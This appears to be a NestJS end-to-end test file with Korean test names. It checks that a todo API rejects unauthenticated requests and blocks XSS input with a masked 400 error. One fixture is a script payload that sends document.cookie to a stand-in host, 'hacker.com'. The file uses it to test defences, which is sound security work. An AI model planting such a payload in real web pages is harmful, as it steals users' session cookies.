import { Test } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import { ZodValidationPipe } from 'nestjs-zod';
import cookieParser from 'cookie-parser';
import request from 'supertest';
import { App } from 'supertest/types';
import { AppModule } from './../src/app.module';

async function createApp(): Promise<INestApplication<App>> {
  const moduleRef = await Test.createTestingModule({
    imports: [AppModule],
  }).compile();

  const app = moduleRef.createNestApplication();
  app.useGlobalPipes(new ZodValidationPipe());
  app.use(cookieParser());
  await app.init();
  return app;
}

describe('POST /todos — 인증', () => {
  let app: INestApplication<App>;

  beforeAll(async () => {
    app = await createApp();
  });

  afterAll(async () => {
    await app.close();
  });

  it('인증 없이 요청하면 401을 반환한다', async () => {
    const res = await request(app.getHttpServer()).post('/todos').send({
      title: '테스트',
      description: '설명',
    });

    expect(res.status).toBe(401);
  });
});

describe('POST /todos — 유효성 및 XSS 방어 검증', () => {
  let app: INestApplication<App>;
  let authCookie: string;

  beforeAll(async () => {
    app = await createApp();

    const email = `e2e-${Date.now()}@test.com`;

    await request(app.getHttpServer()).post('/auth/signup').send({
      email,
      name: 'E2E User',
      password: 'Password123!',
    });

    const loginRes = await request(app.getHttpServer())
      .post('/auth/login')
      .send({ email, password: 'Password123!' });

    authCookie = (loginRes.headers['set-cookie']?.[0] ?? '').split(';')[0];
  });

  afterAll(async () => {
    await app.close();
  });

  it('제목에 XSS 페이로드 주입했는데 다털렸죠? ㅋㅋㅋㅋ', async () => {
    const xssPayload =
      '<script>fetch("http://hacker.com/steal?cookie=" + document.cookie)</script>';

    const res = await request(app.getHttpServer())
      .post('/todos')
      .set('Cookie', authCookie)
      .send({
        title: xssPayload,
        description: '대학생한테 다 털렸죠?',
      });

    // 🛡️ [마스킹 검증] 외부로는 상세 내역을 감추고 공통 에러 포맷으로 차단 성공했는지 체크
    expect(res.status).toBe(400);
    expect(res.body.message).toBe('Validation failed');
    expect(res.body).not.toHaveProperty('stack');
  });

  it('설명(description)에 XSS 페이로드를 주입해도 똑같이 400으로 차단되어야 한다', async () => {
    const xssPayload = '<script>alert("뒷문 공략 실패")</script>';

    const res = await request(app.getHttpServer())
      .post('/todos')
      .set('Cookie', authCookie)
      .send({
        title: '정상적인 제목',
        description: xssPayload,
      });

    // 🛡️ 설명 필드 역시 정보 노출 취약점 없이 공통 포맷으로 완벽 방어 체크
    expect(res.status).toBe(400);
    expect(res.body.message).toBe('Validation failed');
    expect(res.body).not.toHaveProperty('stack');
  });

  it('잘못된 payload면 400을 반환한다', async () => {
    const res = await request(app.getHttpServer())
      .post('/todos')
      .set('Cookie', authCookie)
      .send({ title: '', description: 'test' });

    expect(res.status).toBe(400);
    expect(res.body.message).toBe('Validation failed');
    expect(res.body).not.toHaveProperty('stack');
  });
});
